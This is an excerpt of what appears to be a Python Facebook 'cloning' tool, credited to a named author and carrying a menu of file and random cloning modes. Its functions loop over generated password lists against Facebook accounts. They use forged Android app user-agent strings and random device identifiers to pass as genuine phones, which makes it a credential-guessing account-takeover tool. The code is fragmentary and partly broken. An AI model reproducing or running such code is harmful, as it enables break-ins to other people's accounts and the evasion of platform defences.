...
os.system('xdg-open https://facebook.com/groups/3036595349894927//')
...
=======================================
\033[1;37m--------------------------------------------------
[~] Author   : SAMANDAR KHAN  SHARABYANO RAESS
[~] Facebook : ALIYAxKHANx302
[~] Tool     :  Free
[~] Version  : 0.4
\033[1;37m----------------------------------------------""")
def linex():
...
def menu():
			clear()
		#	linex()
			print(' [1] File cloning\n [2] Random cloning\n [3] Follow me on FACEBOOK ALIYAxKHANx302 [0] Exit menu')
			linex()
...
def pak():
		...
		mthd = input(' Choose: ')
		clear()
		print('\033[1;33m Clone with auto pass (only PK)\n\033[1;32m  [2] \033[1;33mClone with auto pass (only-BD) \n\033[1;32m [3] \033[1;33mClone with auto pass (only-AFG) ')
		linex()
		pcs = input(' [?] Select: ')
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_AFG;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
				li = ['28','29','210']
...
def api3(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(CRACKsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
